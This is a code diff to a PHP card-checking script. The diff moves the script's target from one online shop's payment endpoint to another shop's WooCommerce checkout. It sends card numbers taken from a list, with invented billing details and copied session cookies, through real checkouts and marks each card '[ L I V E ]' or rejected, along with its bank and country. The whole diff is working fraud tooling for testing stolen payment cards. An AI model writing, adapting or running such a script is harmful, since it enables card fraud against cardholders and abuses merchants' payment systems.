@@ -46,10 +46,10 @@ if($cbin == "3"){
    $cardnum = "$cc1 $cc2 $cc3 $cc4";
 }
 
-// If(strlen($ano) > 2)
-// {
-//   $ano = substr($ano,2,2);
-// }
+If(strlen($ano) > 2)
+{
+  $ano = substr($ano,2,2);
+}
  function value($str,$find_start,$find_end){
 $start = @strpos($str,$find_start);
 if ($start === false) {
@@ -205,7 +205,7 @@ curl_close($ch);
 // // //////////////////////// START REQUEST 2 ////////////////////////
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://bttw.com.au/index.php?route=extension/payment/migs_gateway_merchant/send');
+curl_setopt($ch, CURLOPT_URL, 'https://romandaniels.com/?wc-ajax=checkout');
 
 //////////////////////// PROXY CALLS ////////////////////////////
 //               REMOVE '//' FOR PROXIES TO WORK BELOW
@@ -234,19 +234,19 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'Accept: application/json, text/javascript, */*; q=0.01',
-'Accept-Encoding: gzip, deflate, br',
-'Accept-Language: en-US,en;q=0.9',
+'accept: application/json, text/javascript, */*; q=0.01',
+'accept-encoding: gzip, deflate, br',
+'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: OCSESSID=ce25908ab86a67a9ebcfe5d612; language=en-gb; currency=AUD; mailchimp_integration_popup=triggered',
-'origin: https://bttw.com.au',
-'referer: https://bttw.com.au/index.php?route=checkout/checkout',
+'cookie: PHPSESSID=18daeaefb7bf48f1bd896a0984d9b3a1; woocommerce_items_in_cart=1; wp_woocommerce_session_8878161dc01271bf7d1eedb65f03cb32=e3d22299f581ff8cb8ab152803a07fd5%7C%7C1595062961%7C%7C1595059361%7C%7C8ad40e506aaddd4374fdf185af089d64; redux_blast=1594984518; woocommerce_cart_hash=eef632ceb30af7acd218296c92d76ce5',
+'origin: https://romandaniels.com',
+'referer: https://romandaniels.com/checkout/',
 'user-agent: '.$browser.''
 ));
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'firstname=Vincent&lastname=Warner&company=&address_1=12+Avenue+Road&address_2=&city=HIGHGATE&postcode=5063&country_id=13&zone_id=195&=Continue&card_type=visa&card_name=Vincent+Warner&card_num='.$cc.'&card_mon='.$mes.'&card_year='.$ano.'&card_cvv='.$cvv.'&=Continue');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'billing_first_name=Vincent&billing_last_name=Warner&billing_company=&billing_country=AU&billing_address_1=12+Avenue+Road&billing_address_2=&billing_city=HIGHGATE&billing_state=SA&billing_postcode=5063&billing_phone=%2B615182641524&billing_email=pubgkittu%40gmail.com&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=12+Avenue&shipping_address_2=&shipping_city=Bristol&shipping_state=NSW&shipping_postcode=BS3+1SJ&order_comments=&shipping_method%5B0%5D=free_shipping%3A3&payment_method=anz_egate&anz_egate-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&anz_egate-card-expiry='.$mes.'+%2F+'.$ano.'&anz_egate-card-cvc='.$cvv.'&woocommerce-process-checkout-nonce=d9d0e79744&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
 
 // // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
@@ -263,7 +263,7 @@ $message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-e
 
 
 // // /////////////////////// RESULT ////////////////////////////////////
-if(strpos($result,'"success"')){
+if(strpos($result,'"result":"success"')){
 // updatecart();
     echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
     }
@@ -275,7 +275,7 @@ elseif(strpos($result,'Not Acceptable!')) {
 
 else {
 
-            echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
+            echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
 
   }
 curl_close($curl);
